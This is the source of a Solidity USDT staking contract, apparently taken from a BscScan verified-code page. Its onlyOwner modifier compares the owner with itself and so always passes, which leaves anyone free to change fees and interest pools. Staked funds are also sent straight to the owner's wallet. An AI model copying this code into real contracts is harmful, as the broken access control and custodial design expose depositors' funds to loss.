/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-04
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract usdtLocker {
    IERC20 public USDT;
    uint256 public totalContractStaked ; 
    uint256 public totalContractClaimed ; 
    uint256 rewardInterval = 60;
       event Claim (
        address indexed account,
        uint rewardAmount
    );
    struct stakeRecord {
        uint256 stakeAmount;
        uint256 period;
        uint256 interestRate; // per month interest Rate
        uint256 lockTime;
        uint256 lockEndTime;
        uint256 lastUpdatedBlock;
        uint256 claimable;
        uint256 stakeTotalClaimed;

    }
    struct userStruct {
        uint256 balance;
        uint256 totalClaimed;
        uint256 stakeNo;
    }
    mapping(address => userStruct) public user;

    uint256 public stakePool;
    uint256 private stakeCount = 0;
    stakeRecord[] private stakes;
    struct poolNo {
        uint256 no;
        uint256 time;
        uint256 interestRate;
    }

    struct stakeCheck {
        bool deletestake;
    }

    mapping(address => mapping(uint256 => stakeCheck)) stakeInfo;

    address public _owner;
    address public admin ;
    uint256 public fee ;
    mapping(address => mapping(uint256 => stakeRecord)) public stakeHistory;
    mapping(uint256 => poolNo) public timeAndInterest;

    constructor(IERC20 _usdt , address _admin , uint256 _fee) {
        USDT = _usdt;
        _owner = msg.sender;
        admin = _admin ;
        fee = _fee;
    }

    function poolSetting(uint256 _time, uint256 _interestPercent)
        public
        onlyOwner
    {
        uint256 _no = stakePool;
        timeAndInterest[_no].no = stakePool;
        timeAndInterest[_no].time = _time;
        timeAndInterest[_no].interestRate = _interestPercent;
        stakePool++;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function changeFee(uint256 _fee) public onlyOwner {
        fee = _fee;
    }

    function addStake(uint256 amount, uint256 _no)
        public
        returns (stakeRecord memory stakeTable)
    {
        require(
            USDT.balanceOf(msg.sender) >= amount,
            "not enough amount to stake"
        );
        uint256 stakeNumber = user[msg.sender].stakeNo;
        stakeHistory[msg.sender][stakeNumber].stakeAmount = amount;
        uint256 IR = timeAndInterest[_no].interestRate;
        stakeHistory[msg.sender][stakeNumber].interestRate = IR;
        stakeHistory[msg.sender][stakeNumber].lockTime = block.timestamp;
        stakeHistory[msg.sender][stakeNumber].period = timeAndInterest[_no]
            .time;
        stakeHistory[msg.sender][stakeNumber].lockEndTime =
            block.timestamp +
            timeAndInterest[_no].time;
        stakeHistory[msg.sender][stakeNumber].lastUpdatedBlock = block
            .timestamp;
        USDT.transferFrom(msg.sender, owner(), amount);
        user[msg.sender].stakeNo++;
        user[msg.sender].balance += amount;
        totalContractStaked += amount;
        return stakeHistory[msg.sender][stakeNumber];
    }


    function unlockStake (uint256 stakeNumber) public {
       require(stakeHistory[msg.sender][stakeNumber].stakeAmount > 0, "user.amount > 0");
        if(stakeHistory[msg.sender][stakeNumber].lockEndTime > block.timestamp){
        stakeRecord storage user_ = stakeHistory[msg.sender][stakeNumber];
        uint256 feeAmount = user_.stakeAmount * fee /1000 ;
        uint256 diff = user_.stakeAmount - user_.stakeTotalClaimed - feeAmount ;
        stakeInfo[msg.sender][stakeNumber].deletestake = true;
        uint amountToSend = stakeHistory[msg.sender][stakeNumber].stakeAmount;
        USDT.transferFrom(owner(), msg.sender, diff);
        totalContractClaimed += amountToSend ;
        user[msg.sender].balance -= amountToSend;
        delete stakeHistory[msg.sender][stakeNumber];
        }

       if(stakeHistory[msg.sender][stakeNumber].lockEndTime < block.timestamp){
        bool success = claim( stakeNumber); // claims all pending rewards
        uint amountToSend = stakeHistory[msg.sender][stakeNumber].stakeAmount;
         USDT.transferFrom(owner(), msg.sender, amountToSend);
         totalContractClaimed += amountToSend ;
        user[msg.sender].balance -= amountToSend;
        delete stakeHistory[msg.sender][stakeNumber];
        stakeInfo[msg.sender][stakeNumber].deletestake = true;
     //   total[1] += amountToSend;

       
       }
        
    }

    function getReward( address userAddress , uint256 stakeNumber) public view returns (uint256 _reward) {

        uint currentBlock = block.timestamp;
        stakeRecord memory user_ = stakeHistory[userAddress][stakeNumber];
   

        if(user_.stakeAmount == 0 || user_.lastUpdatedBlock > user_.lockEndTime ) 
            return (0);

        if (user_.lockEndTime > currentBlock){
       uint256 timePeriod = (currentBlock - user_.lastUpdatedBlock) /
            rewardInterval;
            uint reward_ = (user_.stakeAmount * (user_.interestRate  * timePeriod)) / 10000;
             return (reward_);
        }

        if(currentBlock > user_.lockEndTime) {
     uint256 timePeriod = (user_.lockEndTime - user_.lastUpdatedBlock) /
            rewardInterval; 
             uint reward_ = (user_.stakeAmount * (user_.interestRate  * timePeriod)) / 10000;
              return (reward_);
        }
       
       
    }

     function claim( uint256 stakeNumber) public returns (bool){
        (uint amount) = getReward(msg.sender ,stakeNumber);

        if(amount == 0)
            return false;
        stakeHistory[msg.sender][stakeNumber].stakeTotalClaimed += amount;
        user[msg.sender].totalClaimed += amount ;
        stakeHistory[msg.sender][stakeNumber].lastUpdatedBlock = block.timestamp;
        USDT.transferFrom(owner(), msg.sender, amount);
        totalContractClaimed += amount ;
        emit Claim(
         msg.sender,
         amount
        );

        return true;
    }

    

    function viewstakeNumber(address userAddress)
        public
        view
        returns (uint256 stakeNumber)
    {
        return user[userAddress].stakeNo;
    }


}